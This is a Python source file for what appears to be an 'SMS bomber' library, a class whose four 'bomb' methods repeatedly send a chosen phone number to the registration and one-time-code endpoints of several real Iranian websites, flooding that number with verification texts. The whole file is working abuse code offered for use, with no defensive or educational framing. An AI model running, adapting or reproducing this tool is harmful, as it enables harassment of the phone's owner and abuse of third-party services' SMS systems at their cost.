import requests as re
from time import sleep
from random import choice , random , randint
from config import __copyright__ , __version__ , __license__ , welcome
from colorama import Fore as f


welcome(f"boombig library virsion {__version__}{__copyright__}")


class sms:
    
    def __init__(self , phonenumber:str , TimeForOnSMS:float , SMS:int):
        self.phonenumber = phonenumber
        self.timeforonsms = TimeForOnSMS
        self.sms = SMS
        self.tim = self.timeforonsms * self.sms

    def bomb1(self):
        url5 = "https://instachap.com/account/RegisterAjax"
        phone5 = {
        "Countries":"+98",
        "countrycode":"+98",
        "mobile":self.phonenumber[1:],
        "password":"nmmamirmmn",
        "repassword":"nmmamirmmn",
        "referralcode":"",
        "ReturnUrl":"https://instachap.com/",
    }
        time = 0
        code = 0
        while code != self.sms:
            while time != self.timeforonsms:
                sleep(0.25)
                time += 0.25
                print(f"{f.CYAN}{time}{f.RESET}")
            re.post(url=url5 , data=phone5)
            code += 1
            print(f"{f.RED}Send Code {f.RESET}: {f.GREEN}{code}{f.RESET}")
            time -= self.timeforonsms
        print(f"{f.MAGENTA}\n<github.com/OnlyRad>\n{f.RESET}")

    def bomb2(self):
        url6 = "https://api.artunity.art/user"
        phone6 = {"phoneNumber":self.phonenumber}
        time = 0
        code = 0
        while code != self.sms:
            while time != self.timeforonsms:
                sleep(0.25)
                time += 0.25
                print(f"{f.CYAN}{time}{f.RESET}")
            re.post(url=url6 , data=phone6)
            code += 1
            print(f"{f.RED}Send Code {f.RESET}: {f.GREEN}{code}{f.RESET}")
            time -= self.timeforonsms
        print(f"{f.MAGENTA}\n<github.com/OnlyRad>\n{f.RESET}")
    def bomb3(self):
        url3 = "https://igame.ir/api/play/otp/send"
        phone3 = {"phone":self.phonenumber}
        time = 0
        code = 0
        while code != self.sms:
            while time != self.timeforonsms:
                sleep(0.25)
                time += 0.25
                print(f"{f.CYAN}{time}{f.RESET}")
            re.post(url=url3 , data=phone3)
            code += 1
            print(f"{f.RED}Send Code {f.RESET}: {f.GREEN}{code}{f.RESET}")
            time -= self.timeforonsms
        print(f"{f.MAGENTA}\n<github.com/OnlyRad>\n{f.RESET}")
    def bomb4(self):
        url = 'https://net120.ir/Home/SendLoginCode'
        phone = {"mobile":self.phonenumber}
        time = 0
        code = 0
        while code != self.sms:
            while time != self.timeforonsms:
                sleep(0.25)
                time += 0.25
                print(f"{f.CYAN}{time}{f.RESET}")

            re.post(url=url , data=phone)
            code += 1
            print(f"{f.RED}Send Code {f.RESET}: {f.GREEN}{code}{f.RESET}")
            time -= self.timeforonsms
        print(f"{f.MAGENTA}\n<github.com/OnlyRad>\n{f.RESET}")
